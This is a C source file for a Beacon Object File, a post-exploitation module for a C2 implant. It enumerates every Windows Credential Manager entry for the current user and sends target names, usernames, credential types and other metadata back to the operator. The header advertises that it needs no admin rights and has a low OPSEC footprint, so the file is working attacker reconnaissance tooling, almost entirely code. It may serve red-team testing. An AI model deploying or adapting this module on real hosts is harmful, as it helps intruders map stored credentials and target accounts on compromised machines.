/*
 * Credential Manager Enumeration BOF
 *
 * Enumerates credentials stored in Windows Credential Manager for the current user.
 * Uses CredEnumerateW API to list all credentials with metadata.
 *
 * Features:
 * - Lists all credentials (Web, Windows, Generic, Certificate-Based)
 * - Shows target name, username, credential type, persistence
 * - Displays credential blob size
 * - No decryption (enumeration only)
 * - Works in current user context (no admin required)
 * - Low OPSEC footprint (standard Windows API)
 *
 * OPSEC: Read-only operation using documented Windows APIs
 */

#include <windows.h>
#include <wincred.h>
#include "beacon.h"

// Credential type strings for output
const char* GetCredentialTypeString(const DWORD type) {
    switch(type) {
        case CRED_TYPE_GENERIC:
            return "GENERIC";
        case CRED_TYPE_DOMAIN_PASSWORD:
            return "DOMAIN_PASSWORD";
        case CRED_TYPE_DOMAIN_CERTIFICATE:
            return "DOMAIN_CERTIFICATE";
        case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
            return "DOMAIN_VISIBLE_PASSWORD";
        case CRED_TYPE_MAXIMUM:
            return "MAXIMUM";
        case CRED_TYPE_MAXIMUM_EX:
            return "MAXIMUM_EX";
        default:
            return "UNKNOWN";
    }
}

// Persistence type strings for output
const char* GetPersistenceString(const DWORD persist) {
    switch(persist) {
        case CRED_PERSIST_SESSION:
            return "SESSION";
        case CRED_PERSIST_LOCAL_MACHINE:
            return "LOCAL_MACHINE";
        case CRED_PERSIST_ENTERPRISE:
            return "ENTERPRISE";
        default:
            return "UNKNOWN";
    }
}

void go(char* args, int len) {
    PCREDENTIALW* credentials = NULL;
    DWORD count = 0;
    BOOL result;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating Windows Credential Manager entries...\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Context: Current user\n\n");

    // Parse arguments (filter is optional)
    datap parser;
    BeaconDataParse(&parser, args, len);

    // Get filter if provided (NULL for all credentials)
    LPWSTR filter = NULL;
    if (len > 0) {
        int extractedSize = 0;
        char* filterStr = BeaconDataExtract(&parser, &extractedSize);
        if (filterStr != NULL && extractedSize > 0) {
            // Convert to wide string using explicit input length
            filter = (LPWSTR)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (extractedSize + 1) * sizeof(WCHAR));
            if (filter) {
                int converted = KERNEL32$MultiByteToWideChar(CP_ACP, 0, filterStr, extractedSize, filter, extractedSize + 1);
                if (converted <= 0) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert filter string, listing all credentials\n");
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, filter);
                    filter = NULL;
                } else {
                    filter[converted] = L'\0';
                }
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate memory for filter, listing all credentials\n");
            }
        }
    }

    // Enumerate all credentials
    result = CredEnumerateW(filter, 0, &count, &credentials);

    // Free filter if allocated
    if (filter) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, filter);
    }

    if (!result) {
        DWORD error = KERNEL32$GetLastError();
        if (error == ERROR_NOT_FOUND) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] No credentials found in Credential Manager\n");
            return;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] CredEnumerateW failed with error: %d\n", error);
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %d credential(s)\n\n", count);
    BeaconPrintf(CALLBACK_OUTPUT, "================================================================================\n\n");

    // Iterate through credentials and display information
    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW cred = credentials[i];

        BeaconPrintf(CALLBACK_OUTPUT, "[Credential %d]\n", i + 1);

        // Target name (always present)
        if (cred->TargetName) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Target:      %S\n", cred->TargetName);
        }

        // Username (may be NULL for some credential types)
        if (cred->UserName) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Username:    %S\n", cred->UserName);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  Username:    (none)\n");
        }

        // Credential type
        BeaconPrintf(CALLBACK_OUTPUT, "  Type:        %s\n", GetCredentialTypeString(cred->Type));

        // Persistence
        BeaconPrintf(CALLBACK_OUTPUT, "  Persistence: %s\n", GetPersistenceString(cred->Persist));

        // Credential blob size (encrypted password/secret)
        if (cred->CredentialBlobSize > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Blob Size:   %d bytes (encrypted)\n", cred->CredentialBlobSize);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  Blob Size:   0 bytes (no password stored)\n");
        }

        // Comment field (if present)
        if (cred->Comment) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Comment:     %S\n", cred->Comment);
        }

        // Last written timestamp
        SYSTEMTIME st;
        FILETIME localFileTime;
        if (!FileTimeToLocalFileTime(&cred->LastWritten, &localFileTime) ||
            !FileTimeToSystemTime(&localFileTime, &st)) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Last Write:  (unavailable)\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  Last Write:  %04d-%02d-%02d %02d:%02d:%02d\n",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        }

        // Flags (if any)
        if (cred->Flags != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Flags:       0x%08X", cred->Flags);
            if (cred->Flags & CRED_FLAGS_PROMPT_NOW) {
                BeaconPrintf(CALLBACK_OUTPUT, " [PROMPT_NOW]");
            }
            if (cred->Flags & CRED_FLAGS_USERNAME_TARGET) {
                BeaconPrintf(CALLBACK_OUTPUT, " [USERNAME_TARGET]");
            }
            BeaconPrintf(CALLBACK_OUTPUT, "\n");
        }

        // TargetAlias (if present)
        if (cred->TargetAlias) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Target Alias: %S\n", cred->TargetAlias);
        }

        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "================================================================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Enumeration complete: %d credential(s) found\n", count);

    // Free the credentials array
    CredFree(credentials);
}
